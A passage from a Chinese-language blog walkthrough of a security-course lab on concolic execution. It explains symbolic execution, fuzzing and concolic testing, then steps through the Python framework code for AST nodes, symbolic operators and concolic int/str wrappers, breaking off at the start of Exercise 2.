）或是特定于某种应用的影响安全的不变量</li><li>最终，对于给出程序中所有可能执行的控制流路径，我们需要决定该尝试哪条路径，因为路径数量会随着程序规模的增大而快速增长，我们不可能尝试所有的路径，因此符号执行系统通常包含确定哪一条路径更有希望发现破坏不变量的某种  <em>调度器</em>  （scheduler）或  <em>搜索策略</em>  （search strategy），一个简单的搜索策略例子便是尝试未执行过的路径，这代表着更高的代码覆盖率与未被发现的漏洞的存在的可能性</li></ul><p>与符号执行相对的一个选择是  <a href="https://en.wikipedia.org/wiki/Fuzz_testing">fuzzing</a> （又称 fuzz-testing，模糊测试），其选择了一个随机化方案：不同于关注触发应用中不同代码路径的原因，fuzzing 会创建随机的具体值交给程序执行并检查其行为；虽然这比符号执行更简单，但通常很难构造能满足程序代码中一些特定情况的输入</p><p>构建符号执行系统的一个挑战是我们的系统需要知道如何在符号值上执行所有可能的操作（上面的 Step 1 &amp; 2），在本 Lab 中我们将在 Python 对象（更准确地说，整型与字符串）上实践，对于符号执行而言这很有挑战性，因为 Python 对象可以实现的操作有很多</p><p>幸运的是我们还有一个更简单的选择——  <em>混合执行</em>  （<strong>concolic execution</strong>），介于完全随机的模糊测试与完全的符号执行之间，相较于跟踪纯净的符号值（如 EXE 中所做），其思想是：对于从输入中得到的变量，我们可以<strong>同时保存一个具体值与一个符号值</strong>，由此：</p><ul><li>若我们的 concolic system 知道应用的行为，我们可以像符号执行那样运行（除了我们还会同时传播每个值的 concrete 部分）；例如，假设我们有两个 concolic 整型变量 <code>aa</code> 与 <code>bb</code>，其有着具体值 <code>5</code> 与 <code>6</code> ，并对应符号表达式 <code>a</code> 与  <code>b</code>，此时若应用创建了一个变量 <code>cc = aa + bb</code>，其会同时有着具体值 <code>11</code> 及符号表达式 <code>a + b</code>；类似地，若应用在 <code>cc == 12</code> 的分支上执行，程序可以像分支为假一样执行，并记录对应的符号分支条件 <code>a + b != 12</code></li><li>若我们的 concolic system 不知道应用的当前行为，应用将只会得到具体的值；例如若应用将 <code>cc</code> 写入文件中，或者是传递到外部库中，代码仍可以使用具体值 <code>11</code> 如同应用正常运行那样继续执行</li></ul><p>对于本 lab 而言，混合执行的好处是我们并不需要完全完成对符号值的操作支持，我们只需要支持足够发现漏洞的操作即可（实际上大部分挖洞系统也是如此），不过若应用执行了我们所不支持的操作，我们将失去对符号部分的跟踪，并无法对这些路径进行符号执行式的（symbolic-execution-style）探索，若想了解更多可以参见  <a href="http://css.csail.mit.edu/6.858/2022/readings/dart.pdf">DART paper</a> </p><h2 id="Concolic-execution-for-integers"><a href="#Concolic-execution-for-integers" class="headerlink" title="Concolic execution for integers"></a>Concolic execution for integers</h2><p>首先我们将为整型值构建一个混合执行系统，本 Lab 为我们的混合执行提供的框架代码位于 <code>symex/fuzzy.py</code> 中，其实现了几个重要的抽象层：</p><ul><li><p><strong>抽象语法树</strong>（The AST）：与此前我们在 <code>int-avg.py</code> 中使用 Z3 表达式来表示符号值所不同的是，本 Lab 构建了其自己的抽象语法树（abstract syntax tree）来表达符号表达式，一个 AST 节点可以是一个简单的变量（ <code>sym_str</code> 或 <code>sym_int</code> 对象）、一个常量（<code>const_int</code>、<code>const_str</code> 或 <code>const_bool</code> 对象）、或是一些将其他 AST 节点作为参数的函数或操作符（例如 <code>sym_eq(a, b)</code> 表示布尔表达式 <code>a==b</code>，其中 <code>a</code> 与 <code>b</code> 都是 AST 节点，或是 <code>sym_plus(a, b)</code> 表示整型表达式 <code>a + b</code>）</p><p>每个 AST 节点 <code>n</code> 都可以使用 <code>z3expr(n)</code> 转化为 Z3 表达式，这由调用 <code>n._z3expr</code> 完成，即每个 AST 节点都实现了返回对应 Z3 表达式的 <code>_z3expr</code> 方法</p><p>我们使用自己的 AST 层而非使用 Z3 的符号表示的原因是因为我们需要实现一些 Z3 表示难以完成的操作，此外我们需要分出一个独立的进程来调用 Z3 的求解器，以在 Z3 求解器耗时过长时杀死进程——将约束归为不可解（这种情况下我们可能失去这些路径，但至少我们会让程序探索其他路径）；使用我们自己的 AST 能让我们将 Z3 状态完全独立在 fork 出的进程里</p></li><li><p><strong>混合封装</strong>（The concolic wrappers）：为了拦截 python-level 的操作并进行混合执行，我们将常规的 <code>int</code> 与 <code>str</code> 对象替换成了混合的子类：<code>concolic_int</code> 继承自 <code>int</code> 而 <code>concolic_str</code> 继承自 <code>str</code>，每一个混合封装都同时存储一个具体值（<code>self.__v</code> ）与一个符号表达式（与 AST 节点，在 <code>self.__sym</code>），当应用在计算混合值表达式（例如 <code>a+1</code> 中的 <code>a</code> 为 <code>concolic_int</code>），我们需要拦截该操作并返回一个同时包含具体值与符号表达式的的混合值</p><p>为了实现这样的拦截操作，我们重载了 <code>concolic_int</code> 与 <code>concolic_str</code> 类中的一些方法，例如 <code>concolic_int.__add__</code> 在上面的例子 <code>a + 1</code> 中会被调用并返回一个新的混合值表示结果</p><p>原则上我们应该也要有一个 <code>concolic_bool</code> 作为 <code>bool</code> 的子类，不幸的是在 Python 中 <code>bool</code> 不能被继承（参见<a href="https://docs.python.org/3/library/functions.html#bool">这里</a> 与 <a href="https://mail.python.org/pipermail/python-dev/2002-March/020822.html">这里</a>），于是我们创建了函数 <code>concolic_bool</code> 作为代替，当我们创建一个混合布尔值时，程序会按其值进行分支，故 <code>concolic_bool</code> 也会为当前路径条件添加一个约束（布尔值的符号表达式与具体值相等的约束），并返回一个具体的布尔值</p></li><li><p><strong>具体输入</strong>（The concrete inputs）：在混合执行下被测试的程序输入都存储在 <code>concrete_values</code> 字典中，在该字典中存储了程序输入的字符串名字，并将每个名字映射到对应的输入值（整型变量的值为python整型，字符串变量为python字符串）</p><p><code>concrete_value</code> 被设为全局变量的原因是应用通过调用 <code>fuzzy.mk_str(name)</code> 或 <code>fuzzy.mk_int(name)</code> 来创建一个混合字符串或混合整型，其返回一个混合值，其中的符号部分为一个新的 AST 节点对应到一个名为 <code>name</code> 的变量，但具体值被在 <code>concrete_values</code> 中查找，若字典中没有与之关联的变量，系统将其设为默认的初始值（整型为0，字符串为空串）</p><p>混合执行框架在一个 <code>InputQueue</code> 对象中维持一个待尝试的不同输入的队列，框架首先会添加一个初始输入（空字典 <code>&#123;&#125;</code>），之后执行代码，若应用进入了分支，混合执行系统将唤醒 Z3 来带来 新的输入以测试代码中的其他分支，将这些输入放到输入队列中，并保持迭代直到没有输入可以尝试</p></li><li><p><strong>可满足性模理论求解器</strong>（The SMT solver）： <code>fork_and_check(c)</code> 函数会检查约束 <code>c</code> （一个 AST 节点）是否为可满足的表达式，并返回一对值：可满足性状态 <code>ok</code> 及示例模型（分配给变量的值），若约束可以被满足则 <code>ok</code> 为 <code>z3.sat</code> ，若约束不可被满足则 <code>ok</code> 为 <code>z3.unsat</code> 或 <code>z3.unknown</code>；该函数内部会 fork 一个独立的进程来运行 Z3 求解器，若耗时超过 <code>z3_timeout</code> 则杀死进程并返回 <code>z3.unknown</code></p></li><li><p><strong>当前路径条件</strong>（The current path condition）：当应用执行并基于混合值决定控制流时（参见上面关于 <code>concolic_bool</code> 的讨论），表示该分支的约束会被添加到 <code>cur_path_constr</code> 列表中，为了生成能够沿着一条分支从一个点进行不同选择的输入，所需的约束为路径上该点之前的约束集合，加上该点的反向约束；为了帮助调试与启发式搜索，触发了分支的代码行的信息会被存放在 <code>cur_path_constr_callers</code> 列表中</p></li></ul><p>接下来我们的工作是完成对 <code>concolic_int</code> 的实现，并将代码应用于混合执行循环的核心，本 Lab 提供了两个测试程序： <code>check-concolic-int.py</code> 与 <code>check-symex-int.py</code></p><h3 id="混合执行框架代码浅析-Part-1"><a href="#混合执行框架代码浅析-Part-1" class="headerlink" title="混合执行框架代码浅析  - Part 1"></a>混合执行框架代码浅析  - Part 1</h3><p>在做 Exercise 之前，我们先看一下这个混合执行框架的代码结构，其核心代码主要位于 <code>symex/fuzzy.py</code> 中</p><h4 id="I-AST-节点"><a href="#I-AST-节点" class="headerlink" title="I. AST 节点"></a>I. AST 节点</h4><p>首先是 AST 节点，作为所有符号类的父类而存在，定义比较简单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_ast</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(self._z3expr())<br></code></pre></td></tr></table></figure><h4 id="II-符号运算"><a href="#II-符号运算" class="headerlink" title="II. 符号运算"></a>II. 符号运算</h4><p>然后是 <code>sym_func_apply</code> 类，作为所有符号操作的父节点，这里主要重载了 <code>__eq__()</code> 和 <code>__hash__()</code> 方法，用于比较与计算哈希值，比较的方法就是判断是否所有参数相等，哈希值的计算则是所有参数的哈希值进行异或：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_func_apply</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> args:<br>      <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(a, sym_ast):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Passing a non-AST node %s %s as argument to %s&quot;</span> % \<br>                        (a, <span class="hljs-built_in">type</span>(a), <span class="hljs-built_in">type</span>(self)))<br>    self.args = args<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(self) != <span class="hljs-built_in">type</span>(o):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.args) != <span class="hljs-built_in">len</span>(o.args):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(sa == oa <span class="hljs-keyword">for</span> (sa, oa) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.args, o.args))<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> functools.reduce(operator.xor, [<span class="hljs-built_in">hash</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br></code></pre></td></tr></table></figure><p>然后是三个类 <code>sym_unop</code> 、<code>sym_binop</code> 、<code>sym_triop</code>，表示带有1、2、3个操作数的封装，可以使用 <code>a</code> 、<code>b</code> 、<code>c</code> 获得第 1、2、3个操作数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_unop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a</span>):<br>    <span class="hljs-built_in">super</span>(sym_unop, self).__init__(a)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_binop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b</span>):<br>    <span class="hljs-built_in">super</span>(sym_binop, self).__init__(a, b)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_triop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b, c</span>):<br>    <span class="hljs-built_in">super</span>(sym_triop, self).__init__(a, b, c)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><p>基于 <code>sym_func_apply</code> 与 <code>op</code> 类，封装了相等比较、与、或、非四个操作，其实现原理主要还是转成 Z3 表达式后利用 Z3 的与或非进行运算：：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Logic expressions</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_eq</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) == z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_and</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.And(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_or</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Or(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_not</span>(<span class="hljs-title class_ inherited__">sym_unop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Not(z3expr(self.a))<br></code></pre></td></tr></table></figure><p>符号数的加减乘除比较等操作都是基于上面封装的 <code>op</code> 类完成的：</p><blockquote><p>乘除等运算需要我们在后续的 Exercise 中自行实现</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_lt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &lt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_gt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &gt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_plus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) + z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_minus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) - z3expr(self.b)<br></code></pre></td></tr></table></figure><h4 id="III-常量"><a href="#III-常量" class="headerlink" title="III. 常量"></a>III. 常量</h4><p>字符串常量 <code>const_str</code> 、整型常量 <code>const_int</code> 、布尔常量 <code>const_bool</code> 的实现比较简单，主要就是继承自 <code>sym_ast</code> 并且储存对应的值，其中字符串常量在转为 Z3 表达式时会调用 <code>z3.StringVal()</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, v</span>):<br>    self.v = v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.v == o.v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.v)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.StringVal(self.v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, i</span>):<br>    self.i = i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.i == o.i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.i)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.i<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_bool</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, b</span>):<br>    self.b = b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_bool):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.b == o.b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.b)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.b<br></code></pre></td></tr></table></figure><h4 id="IV-符号变量"><a href="#IV-符号变量" class="headerlink" title="IV. 符号变量"></a>IV. 符号变量</h4><p>在该框架中定义了两种类型的符号变量：<code>sym_int</code> 与 <code>sym_str</code>，都是直接基础自 AST 节点类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Arithmetic</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Int(self.<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment">###...</span><br><br><span class="hljs-comment">## String operations</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Const(self.<span class="hljs-built_in">id</span>, z3.StringSort())<br></code></pre></td></tr></table></figure><h4 id="V-混合变量"><a href="#V-混合变量" class="headerlink" title="V. 混合变量"></a>V. 混合变量</h4><p>正如前文所言，我们实际上在混合执行引擎当中使用的为混合型（concolic）的变量来储存约束值，框架中提供了三种类型的混合变量——<code>concolic_int</code> （整型）、 <code>concolic_str</code>（字符串）、<code>concolic_bytes</code>（字符数组），其中具体值（conctre value）存放在 <code>__v</code> 成员中，符号值（symbolic value）存放在 <code>__sym</code> 中</p><p>主要是<strong>大量的运算符重载</strong>，这里就不贴完整代码了，可以自己去看（笑）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_int</span>(<span class="hljs-title class_ inherited__">int</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    self = <span class="hljs-built_in">super</span>(concolic_int, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">## ...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_str</span>(<span class="hljs-title class_ inherited__">str</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">str</span><br>    self = <span class="hljs-built_in">super</span>(concolic_str, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_bytes</span>(<span class="hljs-title class_ inherited__">bytes</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">bytes</span><br>    self = <span class="hljs-built_in">super</span>(concolic_bytes, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><hr><p>接下来是 Exercise 2：通过增加整型乘法与除法支持来完成对 <code>symex/fuzzy.py</code> 中 <code>concolic_int</code> 的实现，我们需要重载额外的方法并为乘除法运算添加 AST 节点，并为这些 AST 节点应用 <code>_z3expr</code></p><blockquote><p><strong>Exercise 2.</strong> 